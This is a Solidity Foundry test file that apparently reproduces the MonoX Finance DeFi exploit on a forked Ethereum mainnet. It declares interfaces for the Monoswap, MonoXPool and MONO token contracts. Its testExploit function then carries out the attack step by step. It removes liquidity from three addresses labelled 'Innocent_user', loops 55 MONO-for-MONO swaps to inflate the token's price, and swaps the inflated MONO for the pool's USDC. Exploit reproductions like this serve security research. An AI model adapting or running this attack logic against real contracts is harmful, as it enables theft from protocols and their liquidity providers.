// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";

import {IWETH} from "src/interfaces/IWETH.sol";

import {IUSDC} from "src/interfaces/IUSDC.sol";

interface MonoXPool {

    event ApprovalForAll(address indexed account, address indexed operator, bool approved);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event TransferBatch(
        address indexed operator, address indexed from, address indexed to, uint256[] ids, uint256[] values
    );
    event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value);
    event URI(string value, uint256 indexed id);

    function WETH() external view returns (address);

    function admin() external view returns (address);

    function balanceOf(address account, uint256 id) external view returns (uint256);

    function balanceOfBatch(address[] memory accounts, uint256[] memory ids) external view returns (uint256[] memory);

    function burn(address account, uint256 id, uint256 amount) external;

    function createdAt(uint256) external view returns (uint256);

    function depositWETH(uint256 amount) external;

    function initialize(address _WETH) external;

    function isApprovedForAll(address account, address operator) external view returns (bool);

    function isUnofficial(uint256) external view returns (bool);

    function liquidityLastAddedOf(uint256 pid, address account) external view returns (uint256);

    function mint(address account, uint256 id, uint256 amount) external;

    function mintLp(address account, uint256 id, uint256 amount, bool _isUnofficial) external;

    function owner() external view returns (address);

    function renounceOwnership() external;

    function safeBatchTransferFrom(
        address from,
        address to,
        uint256[] memory ids,
        uint256[] memory amounts,
        bytes memory data
    ) external;

    function safeTransferERC20Token(address token, address to, uint256 amount) external;

    function safeTransferETH(address to, uint256 amount) external;

    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes memory data) external;

    function setAdmin(address _admin) external;

    function setApprovalForAll(address operator, bool approved) external;

    function setURI(string memory uri) external;

    function setWhitelist(address _whitelist, bool _isWhitelist) external;

    function supportsInterface(bytes4 interfaceId) external view returns (bool);

    function topHolder(uint256) external view returns (address);

    function topLPHolderOf(uint256 pid) external view returns (address);

    function totalSupply(uint256) external view returns (uint256);

    function totalSupplyOf(uint256 pid) external view returns (uint256);

    function transferOwnership(address newOwner) external;

    function uri(uint256) external view returns (string memory);

    function withdrawWETH(uint256 amount) external;

}

interface Monoswap {

    event AddLiquidity(
        address indexed provider,
        uint256 indexed pid,
        address indexed token,
        uint256 liquidityAmount,
        uint256 vcashAmount,
        uint256 tokenAmount,
        uint256 price
    );
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event PoolBalanced(address _token, uint256 vcashIn);
    event PoolStatusChanged(address _token, uint8 oldStatus, uint8 newStatus);
    event RemoveLiquidity(
        address indexed provider,
        uint256 indexed pid,
        address indexed token,
        uint256 liquidityAmount,
        uint256 vcashAmount,
        uint256 tokenAmount,
        uint256 price
    );
    event Swap(
        address indexed user,
        address indexed tokenIn,
        address indexed tokenOut,
        uint256 amountIn,
        uint256 amountOut,
        uint256 swapVcashValue
    );
    event SyntheticPoolPriceChanged(address _token, uint256 price);

    function _removeLiquidity(address _token, uint256 liquidity, address to)
        external
        view
        returns (uint256 poolValue, uint256 liquidityIn, uint256 vcashOut, uint256 tokenOut);

    function addLiquidity(address _token, uint256 _amount, address to) external returns (uint256 liquidity);

    function addLiquidityETH(address to) external payable returns (uint256 liquidity);

    function addLiquidityPair(address _token, uint256 vcashAmount, uint256 tokenAmount, address to)
        external
        returns (uint256 liquidity);

    function addSpecialToken(address _token, uint256 _price, uint8 _status) external returns (uint256 _pid);

    function getAmountIn(address tokenIn, address tokenOut, uint256 amountOut)
        external
        view
        returns (uint256 tokenInPrice, uint256 tokenOutPrice, uint256 amountIn, uint256 tradeVcashValue);

    function getAmountOut(address tokenIn, address tokenOut, uint256 amountIn)
        external
        view
        returns (uint256 tokenInPrice, uint256 tokenOutPrice, uint256 amountOut, uint256 tradeVcashValue);

    function getConfig()
        external
        view
        returns (address _vCash, address _weth, address _feeTo, uint16 _fees, uint16 _devFee);

    function getPool(address _token)
        external
        view
        returns (uint256 poolValue, uint256 tokenBalanceVcashValue, uint256 vcashCredit, uint256 vcashDebt);

    function initialize(address _monoXPool, address _vcash) external;

    function lastTradedBlock(address) external view returns (uint256);

    function listNewToken(address _token, uint256 _price, uint256 vcashAmount, uint256 tokenAmount, address to)
        external
        returns (uint256 _pid, uint256 liquidity);

    function monoXPool() external view returns (address);

    function owner() external view returns (address);

    function poolSize() external view returns (uint256);

    function poolSizeMinLimit() external view returns (uint256);

    function pools(address)
        external
        view
        returns (
            uint256 pid,
            uint256 lastPoolValue,
            address token,
            uint8 status,
            uint112 vcashDebt,
            uint112 vcashCredit,
            uint112 tokenBalance,
            uint256 price,
            uint256 createdAt
        );

    function priceAdjusterRole(address) external view returns (bool);

    function rebalancePool(address _token) external;

    function removeLiquidity(address _token, uint256 liquidity, address to, uint256 minVcashOut, uint256 minTokenOut)
        external
        returns (uint256 vcashOut, uint256 tokenOut);

    function removeLiquidityETH(uint256 liquidity, address to, uint256 minVcashOut, uint256 minTokenOut)
        external
        returns (uint256 vcashOut, uint256 tokenOut);

    function renounceOwnership() external;

    function setDevFee(uint16 _devFee) external;

    function setFeeTo(address _feeTo) external;

    function setFees(uint16 _fees) external;

    function setPoolSizeMinLimit(uint256 _poolSizeMinLimit) external;

    function setSynthPoolPrice(address _token, uint256 price) external;

    function setTokenInsurance(address _token, uint256 _insurance) external;

    function setTokenStatus(address _token, uint8 _status) external;

    function swapETHForExactToken(
        address tokenOut,
        uint256 amountInMax,
        uint256 amountOut,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountIn);

    function swapExactETHForToken(address tokenOut, uint256 amountOutMin, address to, uint256 deadline)
        external
        payable
        returns (uint256 amountOut);

    function swapExactTokenForETH(address tokenIn, uint256 amountIn, uint256 amountOutMin, address to, uint256 deadline)
        external
        returns (uint256 amountOut);

    function swapExactTokenForToken(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 amountOutMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountOut);

    function swapTokenForExactETH(address tokenIn, uint256 amountInMax, uint256 amountOut, address to, uint256 deadline)
        external
        returns (uint256 amountIn);

    function swapTokenForExactToken(
        address tokenIn,
        address tokenOut,
        uint256 amountInMax,
        uint256 amountOut,
        address to,
        uint256 deadline
    ) external returns (uint256 amountIn);

    function tokenInsurance(address) external view returns (uint256);

    function tokenPoolStatus(address) external view returns (uint8);

    function transferOwnership(address newOwner) external;

    function updatePoolPrice(address _token, uint256 _newPrice) external;

    function updatePoolStatus(address _token, uint8 _status) external;

    function updatePriceAdjuster(address account, bool _status) external;

}

interface MonoToken {

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);
    event DelegateVotesChanged(address indexed delegate, uint256 previousBalance, uint256 newBalance);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);
    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);
    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);
    event Snapshot(uint256 id);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function DEFAULT_ADMIN_ROLE() external view returns (bytes32);

    function DELEGATION_TYPEHASH() external view returns (bytes32);

    function DOMAIN_TYPEHASH() external view returns (bytes32);

    function MINTER_ROLE() external view returns (bytes32);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function balanceOfAt(address account, uint256 snapshotId) external view returns (uint256);

    function cap() external view returns (uint256);

    function checkpoints(address, uint32) external view returns (uint32 fromBlock, uint256 votes);

    function childChainManagerProxy() external view returns (address);

    function decimals() external view returns (uint8);

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);

    function delegate(address delegatee) external;

    function delegateBySig(address delegatee, uint256 nonce, uint256 expiry, uint8 v, bytes32 r, bytes32 s) external;

    function delegates(address delegator) external view returns (address);

    function deposit(address user, bytes memory depositData) external;

    function getCurrentVotes(address account) external view returns (uint256);

    function getPriorVotes(address account, uint256 blockNumber) external view returns (uint256);

    function getRoleAdmin(bytes32 role) external view returns (bytes32);

    function getRoleMember(bytes32 role, uint256 index) external view returns (address);

    function getRoleMemberCount(bytes32 role) external view returns (uint256);

    function grantRole(bytes32 role, address account) external;

    function hasRole(bytes32 role, address account) external view returns (bool);

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);

    function mint(address _to, uint256 _amount) external;

    function name() external view returns (string memory);

    function nonces(address) external view returns (uint256);

    function numCheckpoints(address) external view returns (uint32);

    function owner() external view returns (address);

    function renounceOwnership() external;

    function renounceRole(bytes32 role, address account) external;

    function revokeRole(bytes32 role, address account) external;

    function setMinter(address _minter) external;

    function snapshot() external returns (uint256 currentId);

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function totalSupplyAt(uint256 snapshotId) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function transferOwnership(address newOwner) external;

    function updateChildChainManager(address newChildChainManagerProxy) external;

    function withdraw(uint256 amount) external;

}

contract ContractTest is Test {

    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUSDC usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    MonoToken mono = MonoToken(0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D);
    Monoswap monoswap = Monoswap(0xC36a7887786389405EA8DA0B87602Ae3902B88A1);
    MonoXPool monopool = MonoXPool(0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4);
    address Monoswap_address = 0xC36a7887786389405EA8DA0B87602Ae3902B88A1;
    address Mono_Token_Address = 0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D;
    address IWETH_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address Innocent_user_1 = 0x7B9aa6ED8B514C86bA819B99897b69b608293fFC;
    address Innocent_user_2 = 0x81D98c8fdA0410ee3e9D7586cB949cD19FA4cf38;
    address Innocent_user_3 = 0xab5167e8cC36A3a91Fd2d75C6147140cd1837355;
    address USDC_Address = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 Amount_Of_MonoToken_On_XPool;

    uint256 public Amount_Of_USDC_On_XPool;

    uint256 public Amoount_Of_Mono_On_This;

    function setUp() public {
        vm.createSelectFork("mainnet", 13_715_025); //fork mainnet at block 13715025
    }

    function testExploit() public {
        mono.approve(Monoswap_address, type(uint256).max);

        WETH.deposit{value: address(this).balance, gas: 40_000}();
        // WETH.balanceOf(address(this));
        // VISR_Balance =  visr.balanceOf(msg.sender);
        emit log_named_uint("WETH Balance", WETH.balanceOf(address(this)));
        WETH.approve(Monoswap_address, 0.1 ether);
        monoswap.swapExactTokenForToken(IWETH_Address, Mono_Token_Address, 0.1 ether, 1, address(this), block.timestamp);
        emit log_named_uint("MonoToken Balance", mono.balanceOf(address(this)));
        RemoveLiquidity_From_3_Users();
        // AddLiquidity For myself
        monoswap.addLiquidity(Mono_Token_Address, 196_875_656, address(this));

        Swap_Mono_for_Mono_55_Times();

        Swap_Mono_For_USDC();

        emit log_named_uint("Exploit completed, USDC Balance", usdc.balanceOf(msg.sender));
    }

    function RemoveLiquidity_From_3_Users() internal {
        uint256 balance_Of_User1 = monopool.balanceOf(Innocent_user_1, 10);

        monoswap.removeLiquidity(Mono_Token_Address, balance_Of_User1, Innocent_user_1, 0, 1);

        uint256 balance_Of_User2 = monopool.balanceOf(Innocent_user_2, 10);

        monoswap.removeLiquidity(Mono_Token_Address, balance_Of_User2, Innocent_user_2, 0, 1);

        uint256 balance_Of_User3 = monopool.balanceOf(Innocent_user_3, 10);

        monoswap.removeLiquidity(Mono_Token_Address, balance_Of_User3, Innocent_user_3, 0, 1);
    }

    function Swap_Mono_for_Mono_55_Times() internal {
        for (uint256 i = 0; i < 55; i++) {
            (,,,,,, Amount_Of_MonoToken_On_XPool,,) = monoswap.pools(Mono_Token_Address);

            monoswap.swapExactTokenForToken(
                Mono_Token_Address,
                Mono_Token_Address,
                Amount_Of_MonoToken_On_XPool - 1,
                0,
                address(this),
                block.timestamp
            );
        }
    }

    function Swap_Mono_For_USDC() internal {
        (,,,,,, Amount_Of_USDC_On_XPool,,) = monoswap.pools(USDC_Address);

        Amoount_Of_Mono_On_This = mono.balanceOf(address(this));

        monoswap.swapTokenForExactToken(
            Mono_Token_Address, USDC_Address, Amoount_Of_Mono_On_This, 4_000_000_000_000, msg.sender, block.timestamp
        );
    }

    receive() external payable {}

    function onERC1155Received(address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data)
        external
        pure
        returns (bytes4)
    {
        bytes4 a = 0xf23a6e61;
        return a;
    }

}
